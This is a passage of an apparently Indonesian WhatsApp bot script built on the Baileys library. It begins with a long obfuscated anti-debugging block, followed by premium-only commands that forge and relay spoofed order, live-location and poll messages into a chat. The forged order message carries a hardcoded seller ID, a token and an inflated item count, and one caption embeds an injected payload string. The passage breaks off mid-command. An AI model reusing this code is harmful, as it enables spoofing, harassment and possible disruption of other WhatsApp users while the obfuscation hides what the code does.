_0xa06008!==_0x9b3db8;},'WUnAM':_0x1eb062(0xa7,0x8f,0x128,0x26,0xdf),'kBcLQ':_0x1eb062(-0x11,0x7b,-0x2f,-0x3a,0x32),'fGYpB':function(_0x3fe14d,_0x5b7e09){return _0x3fe14d+_0x5b7e09;},'lFqSP':_0xe08c1d(0xa1,0x142,0xe3,0x67,0x113)+_0x39642a(0x54d,0x481,0x54a,0x516,0x48e)+'t','amSYQ':function(_0x214ebf,_0x518c24){return _0x214ebf(_0x518c24);},'pJtSf':function(_0x210345,_0x3e47c4){return _0x210345(_0x3e47c4);},'xiIpL':function(_0x3a5d1b,_0x164319){return _0x3a5d1b(_0x164319);},'iRvUc':function(_0x2bdf70,_0x56746b){return _0x2bdf70+_0x56746b;},'HYliz':_0x4cc733(0x565,0x613,0x552,0x62b,0x60a),'ZygQO':_0x607a4d(0x1f1,0x1bc,0x21f,0x198,0x148),'ljaqJ':function(_0x2071ce,_0x510c95){return _0x2071ce===_0x510c95;},'hSgTu':_0x4cc733(0x5d2,0x580,0x55c,0x4ec,0x56b),'cINjx':_0x39642a(0x610,0x4ff,0x5d5,0x5a5,0x56b),'RTGIQ':_0x4cc733(0x4f0,0x5b8,0x631,0x549,0x65a)};function _0x4f0ab8(_0x1d817d){function _0x2d8b3c(_0x10d533,_0x6e7c27,_0x20fc7f,_0x67d554,_0x423e50){return _0x1eb062(_0x6e7c27,_0x20fc7f-0x2af,_0x20fc7f-0x151,_0x67d554-0x2a,_0x423e50-0x163);}var _0x478681={'MADJJ':function(_0xeae8da,_0x11639e){function _0x12e79f(_0x2356c2,_0xf7cfc,_0x1fc2d5,_0x4f0d63,_0x4d03bf){return _0x34d4(_0x4d03bf- -0x271,_0x4f0d63);}return _0x102fbb[_0x12e79f(-0xa8,0x76,0x7c,0x98,-0x23)](_0xeae8da,_0x11639e);},'mPAuk':_0x102fbb[_0x2d8b3c(0x3ea,0x38d,0x374,0x2df,0x32b)],'IhQuX':function(_0x2cd1c9,_0x108efb){function _0x1967d1(_0x5b1118,_0x1c4f5e,_0x3544c8,_0x26fb97,_0x5c1ce5){return _0x2d8b3c(_0x5b1118-0x1b5,_0x3544c8,_0x1c4f5e- -0x1a4,_0x26fb97-0x104,_0x5c1ce5-0x130);}return _0x102fbb[_0x1967d1(0x76,0x9b,0x1,0x60,-0xe)](_0x2cd1c9,_0x108efb);},'SmasE':function(_0x1c800f,_0x3cf9ec){function _0x1da1f6(_0x2d4696,_0x40e2f8,_0x4ef18e,_0x34d646,_0x4ad284){return _0x2d8b3c(_0x2d4696-0x15b,_0x2d4696,_0x4ef18e- -0x44a,_0x34d646-0x93,_0x4ad284-0x47);}return _0x102fbb[_0x1da1f6(-0x1b2,-0x14a,-0x1e2,-0x217,-0x1ee)](_0x1c800f,_0x3cf9ec);},'jbsyQ':function(_0x4a1556,_0xe447a7){function _0x1311b0(_0x527239,_0x3e2cb8,_0x1f7079,_0x50a608,_0x716e2f){return _0x2d8b3c(_0x527239-0x192,_0x3e2cb8,_0x1f7079-0x162,_0x50a608-0x1e1,_0x716e2f-0x123);}return _0x102fbb[_0x1311b0(0x3ba,0x3a3,0x3ca,0x42d,0x3bf)](_0x4a1556,_0xe447a7);},'pYNCC':_0x102fbb[_0x142229(0xd3,0x7b,0xa8,0x16f,0xf1)],'tMvXr':_0x102fbb[_0x2d8b3c(0x2c1,0x3fb,0x369,0x417,0x2a2)],'ZYMEB':function(_0x1cff60){function _0x3d4a6c(_0x338a87,_0x1b4fb1,_0x35c531,_0x5c2c98,_0x4177f9){return _0x2d8b3c(_0x338a87-0x88,_0x338a87,_0x35c531-0xd8,_0x5c2c98-0x1ef,_0x4177f9-0x57);}return _0x102fbb[_0x3d4a6c(0x2b9,0x309,0x310,0x38e,0x366)](_0x1cff60);},'NUgCI':function(_0x24b27f,_0x25f985){function _0x46e811(_0x3b945d,_0x1503e7,_0x597876,_0x1479e7,_0x13d233){return _0x5f3b05(_0x3b945d-0x79,_0x1503e7-0xe1,_0x13d233,_0x1503e7-0x296,_0x13d233-0xf2);}return _0x102fbb[_0x46e811(0x4e6,0x4ff,0x44d,0x5b5,0x470)](_0x24b27f,_0x25f985);},'UCRbN':_0x102fbb[_0x2d8b3c(0x2bb,0x2a5,0x2ed,0x225,0x37c)],'zqaDC':_0x102fbb[_0x2549f3(0x278,0x25b,0x2fe,0x277,0x2c2)],'WzlFH':_0x102fbb[_0x5c5969(0x20e,0x2ba,0x192,0x217,0x22e)],'KhhKI':_0x102fbb[_0x2d8b3c(0x332,0x2a1,0x2ec,0x373,0x372)],'UGEeS':_0x102fbb[_0x2549f3(0x181,0x179,0x21d,0x19d,0x1fc)],'DQtZk':_0x102fbb[_0x142229(0x189,0x85,0x134,0xd0,0x1b9)],'lWAXu':_0x102fbb[_0x5c5969(0x294,0x286,0x178,0x253,0x210)],'GJhwM':_0x102fbb[_0x5f3b05(0x3af,0x3ee,0x2dc,0x394,0x374)],'ksUUj':function(_0x9a032,_0x3c2fda){function _0x10b822(_0x351ce1,_0x10a1a4,_0x2becfd,_0x69303a,_0x32ff7e){return _0x5c5969(_0x32ff7e,_0x10a1a4-0xfb,_0x2becfd-0x18,_0x69303a-0x23,_0x2becfd-0x30a);}return _0x102fbb[_0x10b822(0x3b0,0x45f,0x44c,0x3a8,0x3b3)](_0x9a032,_0x3c2fda);},'QVasJ':function(_0x905fd1,_0x3c2257){function _0x10e73c(_0x5c378e,_0x469643,_0x55277d,_0x5051d1,_0xd9463a){return _0x142229(_0x5c378e-0x35,_0x469643-0x1c,_0x469643-0x218,_0x5051d1,_0xd9463a-0x44);}return _0x102fbb[_0x10e73c(0x3bb,0x38f,0x3e5,0x33b,0x3ee)](_0x905fd1,_0x3c2257);}};function _0x2549f3(_0x38ffd5,_0x22bf80,_0x20da2e,_0x46ab05,_0x3e88c0){return _0x39642a(_0x38ffd5-0xac,_0x22bf80-0xbb,_0x20da2e-0x1a6,_0x20da2e- -0x29c,_0x22bf80);}function _0x5c5969(_0x5eb21d,_0x18ca15,_0x51fa59,_0x54b561,_0x3f562e){return _0x1eb062(_0x5eb21d,_0x3f562e-0x1ab,_0x51fa59-0x1bf,_0x54b561-0x95,_0x3f562e-0x1e3);}function _0x142229(_0x2db340,_0x5deca2,_0x5966e2,_0x55a46d,_0xa28568){return _0x1eb062(_0x55a46d,_0x5966e2-0xce,_0x5966e2-0xf,_0x55a46d-0x5d,_0xa28568-0xae);}function _0x5f3b05(_0xe58c47,_0x537f10,_0x1d72ba,_0x2c84ef,_0x285a17){return _0x607a4d(_0x1d72ba,_0x537f10-0x1e0,_0x1d72ba-0x177,_0x2c84ef-0x118,_0x285a17-0x154);}if(_0x102fbb[_0x2549f3(0x298,0x1bf,0x231,0x196,0x2da)](_0x102fbb[_0x142229(0x215,0x12f,0x1a1,0x1dc,0x195)],_0x102fbb[_0x5f3b05(0x3c6,0x2fe,0x478,0x3ba,0x34f)])){var _0x288751={'kAlVc':_0x102fbb[_0x5c5969(0x2f7,0x1e3,0x2f5,0x246,0x23c)],'NeZoT':_0x102fbb[_0x142229(0x77,0x3b,0xbc,0x138,0xdb)],'AvxrP':function(_0x8da3f1,_0x17156c){function _0x590b26(_0x47b53a,_0x3d6f7c,_0x3324ed,_0x496070,_0x2d1a90){return _0x2549f3(_0x47b53a-0x122,_0x3d6f7c,_0x2d1a90- -0x126,_0x496070-0x22,_0x2d1a90-0x1d8);}return _0x102fbb[_0x590b26(0xbb,0xbb,0x197,0x1b7,0x11e)](_0x8da3f1,_0x17156c);},'ydPxN':_0x102fbb[_0x142229(0x13f,0x104,0x128,0x16f,0x1c5)],'bwUyq':function(_0x586e7c,_0x2d44b2){function _0x48bfa0(_0x713753,_0x8f2d5e,_0x2ed6f4,_0x46a472,_0x7d3842){return _0x142229(_0x713753-0x187,_0x8f2d5e-0x7a,_0x2ed6f4-0x34d,_0x7d3842,_0x7d3842-0x1b3);}return _0x102fbb[_0x48bfa0(0x47a,0x3ca,0x3d4,0x388,0x43c)](_0x586e7c,_0x2d44b2);},'NXAzB':_0x102fbb[_0x142229(0x141,0x62,0x113,0x1b6,0xea)],'qAcPj':_0x102fbb[_0x5c5969(0x15b,0x17d,0x1eb,0x159,0x19e)],'xFYOO':function(_0x296628){function _0xe9abcf(_0x23d152,_0x3c2166,_0x4ee391,_0x246057,_0xc74a78){return _0x5f3b05(_0x23d152-0x196,_0x3c2166-0xb,_0xc74a78,_0x4ee391- -0x307,_0xc74a78-0x10c);}return _0x102fbb[_0xe9abcf(0x70,0x54,0x88,0x47,0x66)](_0x296628);}};_0x102fbb[_0x2549f3(0x312,0x359,0x2a9,0x309,0x2d5)](_0x35e53d,this,function(){var _0x299298=new _0x4a3847(_0x288751[_0x24d3a8(0x553,0x5af,0x58e,0x598,0x616)]);function _0x415eae(_0x336c65,_0x4f4377,_0x4b6cf9,_0x13699c,_0x4023f0){return _0x5c5969(_0x4023f0,_0x4f4377-0x104,_0x4b6cf9-0x1eb,_0x13699c-0x11b,_0x4b6cf9-0x87);}function _0x2929f7(_0x4b24d9,_0x584a40,_0x417c3b,_0x40a8fd,_0x151fab){return _0x5c5969(_0x4b24d9,_0x584a40-0x172,_0x417c3b-0x147,_0x40a8fd-0x14a,_0x417c3b- -0xe3);}var _0x8693e=new _0x53bfca(_0x288751[_0x24d3a8(0x5ce,0x571,0x597,0x582,0x4df)],'i');function _0xd1dbd1(_0x2c8dc3,_0x508f1d,_0x1f0a18,_0x1da516,_0x3fb927){return _0x2d8b3c(_0x2c8dc3-0x179,_0x1f0a18,_0x3fb927- -0x33e,_0x1da516-0xd,_0x3fb927-0x75);}function _0x24d3a8(_0x167173,_0x549841,_0x564688,_0x455ad7,_0x90cd04){return _0x5f3b05(_0x167173-0x1d2,_0x549841-0xd8,_0x549841,_0x564688-0x303,_0x90cd04-0x1cf);}var _0x20689d=_0x288751[_0x38ad68(-0x235,-0x13c,-0x1da,-0x1ae,-0x247)](_0x248912,_0x288751[_0x38ad68(-0x123,-0x1bb,-0x1e0,-0x27c,-0x1a6)]);function _0x38ad68(_0x391992,_0x3c1ad8,_0x3d817b,_0x53ec86,_0x138ff6){return _0x2549f3(_0x391992-0x74,_0x138ff6,_0x3d817b- -0x3b2,_0x53ec86-0x15d,_0x138ff6-0x96);}!_0x299298[_0x24d3a8(0x656,0x591,0x5b5,0x5dd,0x5dc)](_0x288751[_0x415eae(0x214,0x263,0x27a,0x321,0x33a)](_0x20689d,_0x288751[_0x24d3a8(0x585,0x5de,0x5bb,0x5ab,0x56e)]))||!_0x8693e[_0x24d3a8(0x5e1,0x62a,0x5b5,0x603,0x538)](_0x288751[_0x38ad68(-0x205,-0x12e,-0x142,-0xde,-0x1f9)](_0x20689d,_0x288751[_0x415eae(0x27c,0x34b,0x2b9,0x365,0x244)]))?_0x288751[_0x38ad68(-0x273,-0x188,-0x1da,-0x1ca,-0x13c)](_0x20689d,'0'):_0x288751[_0xd1dbd1(-0x118,-0xe2,-0xfc,-0x4f,-0xee)](_0x174541);})();}else{if(_0x102fbb[_0x5c5969(0x211,0x2e6,0x2bb,0x275,0x278)](typeof _0x1d817d,_0x102fbb[_0x5f3b05(0x340,0x2ab,0x266,0x2c2,0x1fe)])){if(_0x102fbb[_0x142229(0x7d,-0x3e,0x70,0x8,-0x54)](_0x102fbb[_0x142229(0x168,0x1b0,0x162,0x224,0x1dc)],_0x102fbb[_0x5f3b05(0x24f,0x35a,0x380,0x308,0x2c6)]))return function(_0x433090){}[_0x5c5969(0x16d,0x2b6,0x290,0x21b,0x215)+_0x2d8b3c(0x232,0x346,0x2f0,0x33c,0x2b4)+'r'](_0x102fbb[_0x2d8b3c(0x364,0x3bd,0x313,0x396,0x2cf)])[_0x142229(0x181,0x18c,0x14d,0x178,0x17f)](_0x102fbb[_0x2d8b3c(0x233,0x30e,0x25a,0x201,0x267)]);else _0x478681[_0x2549f3(0x224,0x327,0x2ec,0x281,0x26a)](_0x41a037,'0');}else{if(_0x102fbb[_0x5f3b05(0x40c,0x3ba,0x3f0,0x3b4,0x315)](_0x102fbb[_0x2549f3(0x19d,0x1b0,0x19e,0x1bf,0x226)],_0x102fbb[_0x5c5969(0x1e9,0x2e7,0x219,0x1fe,0x272)])){var _0x44dc3e=_0x4edc81?function(){function _0x396dfd(_0x3e109a,_0xc4ef67,_0x408482,_0x5b6d12,_0x9a322d){return _0x142229(_0x3e109a-0xd1,_0xc4ef67-0xcf,_0x9a322d-0x3a4,_0x3e109a,_0x9a322d-0x17d);}if(_0x544260){var _0x4a639b=_0x88ddb0[_0x396dfd(0x44a,0x4db,0x4f5,0x42d,0x4f1)](_0x524968,arguments);return _0x484ae0=null,_0x4a639b;}}:function(){};return _0x6af4f=![],_0x44dc3e;}else{if(_0x102fbb[_0x142229(0x48,0xa4,0xd7,0x15e,0x120)](_0x102fbb[_0x5c5969(0x1d4,0x11c,0xd6,0x21b,0x164)]('',_0x102fbb[_0x2d8b3c(0x288,0x25f,0x258,0x208,0x1c2)](_0x1d817d,_0x1d817d))[_0x102fbb[_0x2d8b3c(0x3f5,0x334,0x3a2,0x2dc,0x30c)]],0x1589+-0x8*-0x15b+0x94*-0x38)||_0x102fbb[_0x5f3b05(0x2d3,0x3d6,0x366,0x365,0x354)](_0x102fbb[_0x5f3b05(0x42e,0x390,0x346,0x3d0,0x323)](_0x1d817d,-0x11d9+0xf86+-0x29*-0xf),-0x1fd3+-0x102e+0x3001)){if(_0x102fbb[_0x142229(0x1fb,0x1ff,0x19b,0x1f4,0x17a)](_0x102fbb[_0x5c5969(0x292,0x284,0x2d7,0x200,0x2a0)],_0x102fbb[_0x5f3b05(0x246,0x346,0x276,0x29e,0x235)])){var _0x1e1984=_0x478681[_0x5c5969(0x19f,0x16a,0x174,0x1ec,0x1b3)][_0x5c5969(0x1f1,0x279,0x243,0x260,0x25c)]('|'),_0x3c6460=-0x2215+-0x1*-0x80+0x1*0x2195;while(!![]){switch(_0x1e1984[_0x3c6460++]){case'0':var _0x45d384;continue;case'1':try{var _0x446503=_0x478681[_0x2d8b3c(0x210,0x22f,0x24f,0x1cf,0x1f1)](_0x5ae714,_0x478681[_0x142229(0x1e8,0xf6,0x19f,0x200,0xef)](_0x478681[_0x5f3b05(0x29b,0x321,0x20c,0x262,0x1c1)](_0x478681[_0x5f3b05(0x433,0x420,0x3b2,0x3d3,0x336)],_0x478681[_0x142229(0xc1,0x73,0x124,0xf5,0x68)]),');'));_0x45d384=_0x478681[_0x2d8b3c(0x416,0x3a8,0x3a6,0x388,0x336)](_0x446503);}catch(_0x53b912){_0x45d384=_0x2bc152;}continue;case'2':for(var _0x1292fe=0x21e*0x12+-0x1b03+-0xb19*0x1;_0x478681[_0x5c5969(0x234,0x107,0x1fb,0x1c7,0x1a1)](_0x1292fe,_0x1c2ba4[_0x5f3b05(0x386,0x3f8,0x31e,0x37f,0x40d)+'h']);_0x1292fe++){var _0x2cb678=_0x478681[_0x5f3b05(0x2de,0x318,0x20f,0x2c5,0x382)][_0x5c5969(0x232,0x202,0x24d,0x286,0x25c)]('|'),_0x35ecf5=-0x2223+-0x101*0x3+0x2526;while(!![]){switch(_0x2cb678[_0x35ecf5++]){case'0':_0x3a189d[_0x5c5969(0x26e,0x319,0x230,0x305,0x277)+_0x2d8b3c(0x326,0x375,0x2fe,0x30a,0x27c)]=_0x15e399[_0x5f3b05(0x3eb,0x43b,0x30b,0x3b3,0x3b6)+_0x5f3b05(0x370,0x2cf,0x35a,0x336,0x398)][_0x5c5969(0x1f1,0xa4,0x150,0x13c,0x166)](_0x15e399);continue;case'1':var _0x291c70=_0x1c2ba4[_0x1292fe];continue;case'2':var _0x15e399=_0x3f2ef2[_0x291c70]||_0x3a189d;continue;case'3':var _0x3a189d=_0x56f109[_0x5f3b05(0x39c,0x3cf,0x358,0x351,0x32f)+_0x2d8b3c(0x26d,0x35b,0x2f0,0x288,0x2ca)+'r'][_0x142229(0x6d,0x14e,0x95,-0x26,-0x22)+_0x142229(0x8f,0x20,0xa6,0x84,0x28)][_0x5f3b05(0x328,0x25b,0x34c,0x2a2,0x24b)](_0x40c72c);continue;case'4':_0x3a189d[_0x142229(0x147,0x177,0x18a,0x1f5,0x12e)+_0x5c5969(0xd6,0xfd,0xbd,0x1d6,0x17f)]=_0x2914f4[_0x2d8b3c(0x2b3,0x1e6,0x26a,0x1e6,0x238)](_0x349ed1);continue;case'5':_0x3f2ef2[_0x291c70]=_0x3a189d;continue;}break;}}continue;case'3':var _0x3f2ef2=_0x45d384[_0x2549f3(0x269,0x1b4,0x229,0x255,0x24a)+'le']=_0x45d384[_0x2549f3(0x2ab,0x2e3,0x229,0x203,0x209)+'le']||{};continue;case'4':var _0x1c2ba4=[_0x478681[_0x2549f3(0x31b,0x28c,0x2b4,0x205,0x1f1)],_0x478681[_0x5c5969(0x1fe,0x199,0x233,0x18f,0x187)],_0x478681[_0x5f3b05(0x36c,0x403,0x3ac,0x3ad,0x31c)],_0x478681[_0x5f3b05(0x377,0x3a0,0x350,0x3c4,0x403)],_0x478681[_0x5c5969(0x11f,0x1f1,0xe9,0x1f1,0x139)],_0x478681[_0x2549f3(0x256,0x2af,0x1f2,0x14f,0x2b2)],_0x478681[_0x5c5969(0x208,0x2a7,0x26e,0x297,0x276)]];continue;}break;}}else(function(){function _0x15fc1c(_0xb13ea3,_0x336ea3,_0x530fd1,_0x11e646,_0x3b3935){return _0x5c5969(_0xb13ea3,_0x336ea3-0x89,_0x530fd1-0x184,_0x11e646-0x6e,_0x336ea3- -0x34e);}function _0x161ef8(_0xeb7938,_0x16286a,_0x183f0b,_0x27f1c9,_0x1ed7a5){return _0x5f3b05(_0xeb7938-0x132,_0x16286a-0x1a4,_0x27f1c9,_0xeb7938- -0x49a,_0x1ed7a5-0x102);}function _0x25f5a6(_0x19731d,_0x4786cf,_0x4b4167,_0x27bdd9,_0x3df730){return _0x2549f3(_0x19731d-0xbe,_0x3df730,_0x4786cf- -0x38f,_0x27bdd9-0x1b0,_0x3df730-0x1df);}function _0x356494(_0x59170c,_0x4fd5a1,_0x2427c7,_0x2c9b0c,_0x4dd470){return _0x5c5969(_0x2427c7,_0x4fd5a1-0x178,_0x2427c7-0x1a,_0x2c9b0c-0xd0,_0x4fd5a1- -0x88);}if(_0x102fbb[_0x356494(0x161,0x1a1,0x1d1,0x13c,0x111)](_0x102fbb[_0x15fc1c(-0x19f,-0x1cc,-0x23a,-0x145,-0x137)],_0x102fbb[_0x356494(0x37,0xfa,0x12f,0xb3,0x48)]))return!![];else{var _0x256712=_0x341247[_0x15fc1c(-0x1b9,-0x124,-0x172,-0x6e,-0xd8)](_0x1eb6fe,arguments);return _0x10f287=null,_0x256712;}}[_0x5c5969(0x239,0x1ef,0x233,0x18e,0x215)+_0x142229(0x12f,0xdb,0x10f,0xf5,0xd0)+'r'](_0x102fbb[_0x2d8b3c(0x2c9,0x3b9,0x372,0x2b4,0x3fb)](_0x102fbb[_0x5c5969(0x1fa,0x217,0x309,0x1dc,0x25e)],_0x102fbb[_0x2d8b3c(0x301,0x29c,0x24a,0x2ab,0x1ec)]))[_0x5c5969(0x2e9,0x278,0x27a,0x23b,0x255)](_0x102fbb[_0x5c5969(0x1ad,0x2de,0x274,0x2e4,0x224)]));}else{if(_0x102fbb[_0x5c5969(0x19b,0x1b5,0x1dc,0x1c8,0x1ab)](_0x102fbb[_0x5c5969(0x25a,0x117,0x13d,0x133,0x1dc)],_0x102fbb[_0x2549f3(0x248,0x1ef,0x1de,0x20b,0x223)]))(function(){function _0x30863c(_0x47ffdc,_0x4db1b0,_0x5ad60d,_0x2d0402,_0x28ba1d){return _0x142229(_0x47ffdc-0x185,_0x4db1b0-0x174,_0x47ffdc-0x496,_0x4db1b0,_0x28ba1d-0x10c);}function _0x1d1687(_0x4a8f11,_0x2b83a6,_0x2a84ab,_0xef41b1,_0x5b2fd0){return _0x5f3b05(_0x4a8f11-0x18d,_0x2b83a6-0x174,_0x2a84ab,_0x2b83a6- -0x40c,_0x5b2fd0-0x155);}function _0x57b1a7(_0x4e9ee9,_0x5a1723,_0x175505,_0x4aabb9,_0x22c4ce){return _0x5f3b05(_0x4e9ee9-0x1d7,_0x5a1723-0x1d8,_0x4aabb9,_0x4e9ee9- -0x32c,_0x22c4ce-0x166);}return _0x102fbb[_0x57b1a7(0x62,0x58,0x27,0x123,0x77)](_0x102fbb[_0x57b1a7(-0x76,-0x100,0x46,0x3c,-0x12b)],_0x102fbb[_0x57b1a7(-0x76,-0x7,-0x9b,-0x46,0x3c)])?!![]:![];}[_0x2549f3(0x2ee,0x1cc,0x292,0x2bf,0x2ff)+_0x2d8b3c(0x24a,0x382,0x2f0,0x34e,0x280)+'r'](_0x102fbb[_0x2d8b3c(0x3a6,0x3f9,0x361,0x3a1,0x3b6)](_0x102fbb[_0x2d8b3c(0x3e0,0x373,0x362,0x2ef,0x352)],_0x102fbb[_0x142229(0x12,0x6f,0x69,0xd5,0x13)]))[_0x142229(0x165,0xac,0x14d,0xfe,0x1ac)](_0x102fbb[_0x2d8b3c(0x3a3,0x3f4,0x346,0x3c6,0x29d)]));else{var _0x176bd4=function(){function _0x40a825(_0x577d79,_0x284c7c,_0x3be77c,_0xceaa5f,_0xa96807){return _0x2549f3(_0x577d79-0xea,_0xceaa5f,_0xa96807-0x230,_0xceaa5f-0xf3,_0xa96807-0x19);}var _0x23130a;function _0x2e7a81(_0x1ae1f2,_0x33003f,_0x170512,_0x40ecbf,_0x45e6c4){return _0x2d8b3c(_0x1ae1f2-0x189,_0x33003f,_0x170512- -0x45e,_0x40ecbf-0x17b,_0x45e6c4-0x1bb);}function _0x273edf(_0x5455e7,_0x10a9ab,_0x16ba02,_0x5f073b,_0x4db26d){return _0x142229(_0x5455e7-0xe5,_0x10a9ab-0x66,_0x5455e7-0x449,_0x10a9ab,_0x4db26d-0x1ee);}function _0x1ed9ae(_0x42732f,_0x31f40f,_0x2ee0e8,_0x242efb,_0x553012){return _0x2d8b3c(_0x42732f-0x3a,_0x31f40f,_0x553012- -0x29e,_0x242efb-0x108,_0x553012-0xda);}function _0xc8ae49(_0x207c14,_0xdf683e,_0x47d82c,_0x15f700,_0x239a8f){return _0x5c5969(_0x207c14,_0xdf683e-0x147,_0x47d82c-0x161,_0x15f700-0x12d,_0x239a8f- -0xfa);}try{_0x23130a=_0x478681[_0xc8ae49(0x1e9,0xc0,0x1a4,0xb1,0x14d)](_0x5e9b5c,_0x478681[_0xc8ae49(-0x6f,0x64,-0x25,0xa1,0x2c)](_0x478681[_0xc8ae49(0x230,0x190,0x1c8,0x14f,0x1a3)](_0x478681[_0x2e7a81(-0x75,-0x88,-0xc3,-0x18a,-0xf7)],_0x478681[_0xc8ae49(0x15c,0xdc,0x66,0x42,0x107)]),');'))();}catch(_0x49dcae){_0x23130a=_0x145b11;}return _0x23130a;},_0x177209=_0x478681[_0x142229(0x193,0x243,0x1c5,0x252,0x1fa)](_0x176bd4);_0x177209[_0x5f3b05(0x340,0x22d,0x29f,0x2ec,0x2ee)+_0x2549f3(0x2de,0x236,0x2a4,0x293,0x1fa)+'l'](_0x37d8e5,0x22d2+0x22cf+-0x3601);}}}}_0x102fbb[_0x5f3b05(0x20f,0x2b1,0x29d,0x2ce,0x2a3)](_0x4f0ab8,++_0x1d817d);}}function _0x607a4d(_0x49834c,_0x248250,_0x264d1b,_0x5c90fd,_0x188eee){return _0x3fc12e(_0x49834c-0x113,_0x49834c,_0x264d1b-0x129,_0x5c90fd-0x1cc,_0x5c90fd-0x36c);}function _0x39642a(_0x2e3d97,_0x20f41e,_0x1ef9a6,_0x210ef1,_0xde1c43){return _0x1cb810(_0x2e3d97-0xf8,_0x20f41e-0x1d5,_0xde1c43,_0x210ef1-0x3f4,_0xde1c43-0x3f);}function _0xe08c1d(_0x426b53,_0x157a42,_0x270149,_0x38e9e3,_0x520bed){return _0x1cb810(_0x426b53-0xee,_0x157a42-0x5a,_0x157a42,_0x520bed- -0xaa,_0x520bed-0x2e);}function _0x4cc733(_0x55cabf,_0x3ba3b6,_0x2568eb,_0x26b2fb,_0x41e29b){return _0x1d1cb0(_0x2568eb,_0x3ba3b6-0x120,_0x2568eb-0x2e,_0x26b2fb-0x104,_0x3ba3b6-0x1c);}try{if(_0x102fbb[_0x39642a(0x3f3,0x3bf,0x483,0x466,0x4c3)](_0x102fbb[_0x1eb062(0xaa,0x92,0x78,0x7e,0x8d)],_0x102fbb[_0x39642a(0x579,0x571,0x548,0x563,0x5e5)])){if(_0x59ef50){if(_0x102fbb[_0x607a4d(0x228,0x288,0x2b6,0x218,0x263)](_0x102fbb[_0x1eb062(0x15b,0xa1,0x14c,-0x23,0xb)],_0x102fbb[_0xe08c1d(-0x56,0x33,0x5f,-0x54,0x49)])){if(_0x51c777)return _0x4e99d1;else _0x102fbb[_0xe08c1d(0x15c,0x14,0x71,0xb8,0xbc)](_0x2c2cfa,-0x401*-0x2+0x7*0x491+0x471*-0x9);}else return _0x4f0ab8;}else{if(_0x102fbb[_0x4cc733(0x534,0x5c0,0x52f,0x634,0x539)](_0x102fbb[_0x39642a(0x41d,0x3cf,0x42b,0x439,0x4da)],_0x102fbb[_0x1eb062(-0xe7,-0x8b,-0x11,-0x50,-0x9a)])){var _0x45712a;try{_0x45712a=_0x102fbb[_0x4cc733(0x68c,0x5c7,0x66a,0x54d,0x623)](_0x5da606,_0x102fbb[_0xe08c1d(0x6f,-0x17,-0x6,-0x5a,-0x21)](_0x102fbb[_0xe08c1d(-0x114,-0x87,-0xed,0x3d,-0x53)](_0x102fbb[_0x607a4d(0x234,0x1d3,0x20b,0x1a9,0x25a)],_0x102fbb[_0x4cc733(0x61c,0x67a,0x661,0x638,0x6dd)]),');'))();}catch(_0x47bc35){_0x45712a=_0x411e2d;}return _0x45712a;}else _0x102fbb[_0x1eb062(-0x5e,-0x70,0xc,0x58,0x5)](_0x4f0ab8,-0x1d07+0x816+-0x3*-0x6fb);}}else(function(){return![];}[_0x1eb062(0xcf,0x6a,0xb2,0x126,0x76)+_0x4cc733(0x5ec,0x601,0x6bf,0x616,0x589)+'r'](_0x102fbb[_0xe08c1d(-0xc9,-0xd6,0x49,-0x9c,-0x53)](_0x102fbb[_0x39642a(0x59f,0x573,0x524,0x577,0x5ba)],_0x102fbb[_0x4cc733(0x5ce,0x55b,0x571,0x5cf,0x4ff)]))[_0x4cc733(0x5cf,0x63f,0x610,0x609,0x600)](_0x102fbb[_0x4cc733(0x5ed,0x657,0x59f,0x64b,0x6fe)]));}catch(_0x5e1d8c){}}
}
break
case 'jaditroli': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${teks}`,
"orderTitle": `${teks}`,
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted:m })
haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
}
break
//=================================================//
case 'jadilokas': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": ` ${teks} ${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m })
haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
}
break
//=================================================//
case 'jadipolling': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": `Salam kenal saya ${teks}`,
"options": [
{
"optionName": `Saya ${teks}`
},
{
"optionName": `Dimari Kalau Ada ${teks} Jangan lari`
}
],
"selectableOptionsCount": 2
}
}), { userJid: m.chat, quoted:m })
haikal.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
}
}
break
//=================================================//
case 'jadikatalog': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!quoted) throw 'Reply Image/sticker'
let teks = `${q}`
{
